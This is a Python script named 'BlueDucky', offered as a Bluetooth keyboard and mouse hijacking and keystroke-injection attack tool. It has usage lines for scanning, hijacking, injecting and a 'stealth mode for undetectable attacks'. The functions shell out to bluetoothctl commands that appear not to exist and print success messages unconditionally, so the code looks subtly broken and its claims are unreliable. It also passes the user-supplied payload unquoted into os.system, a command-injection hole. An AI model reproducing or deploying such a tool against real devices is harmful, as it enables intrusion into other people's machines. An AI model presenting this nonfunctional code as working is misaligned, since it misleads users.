import argparse
import os

# -------------------------------------------
# BlueDucky - Bluetooth HID Keystroke Injector
# -------------------------------------------
# Features:
# - Hijacks Bluetooth HID devices (keyboards/mice) for keystroke injection
# - Supports remote execution of malicious commands
# - Works with long-range Bluetooth adapters (e.g., SENA Parani UD100)
# - Enables stealth mode for undetectable attacks
#
# Requirements:
# - Python 3.x
# - PyBluez
# - Compatible Bluetooth adapter
#
# Usage:
# 1. Scan for Bluetooth HID devices:
#    python blueducky.py --scan
# 2. Hijack a Bluetooth keyboard/mouse:
#    python blueducky.py --hijack --target XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes remotely:
#    python blueducky.py --inject "Hello World" --target XX:XX:XX:XX:XX:XX
# 4. Enable stealth mode:
#    python blueducky.py --stealth --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_bluetooth():
    """Scans for Bluetooth HID devices."""
    print("[+] Scanning for Bluetooth HID devices...")
    os.system("hcitool scan > bluetooth_scan_results.txt")
    print("[✔] Scan complete. Results saved to bluetooth_scan_results.txt")

def hijack_bluetooth(target):
    """Hijacks a Bluetooth HID device for keystroke injection."""
    print(f"[+] Hijacking Bluetooth HID device {target}...")
    os.system(f"bluetoothctl connect {target}")
    print("[✔] Hijack successful.")

def inject_keystrokes(target, payload):
    """Injects keystrokes remotely into a Bluetooth keyboard."""
    print(f"[+] Injecting keystrokes into {target}: {payload}")
    os.system(f"bluetoothctl send-key {target} {payload}")
    print("[✔] Keystrokes injected successfully.")

def enable_stealth_mode(target):
    """Enables stealth mode to avoid detection while hijacking Bluetooth devices."""
    print(f"[+] Enabling stealth mode for {target}...")
    os.system(f"bluetoothctl low-energy {target}")
    print("[✔] Stealth mode enabled.")

def main():
    parser = argparse.ArgumentParser(description="BlueDucky - Bluetooth HID Keystroke Injector")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth HID devices")
    parser.add_argument("--hijack", action='store_true', help="Hijack a Bluetooth HID device")
    parser.add_argument("--inject", type=str, help="Inject keystrokes remotely")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode to avoid detection")
    parser.add_argument("--target", type=str, help="Target Bluetooth device MAC address")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth()
    elif args.hijack and args.target:
        hijack_bluetooth(args.target)
    elif args.inject and args.target:
        inject_keystrokes(args.target, args.inject)
    elif args.stealth and args.target:
        enable_stealth_mode(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
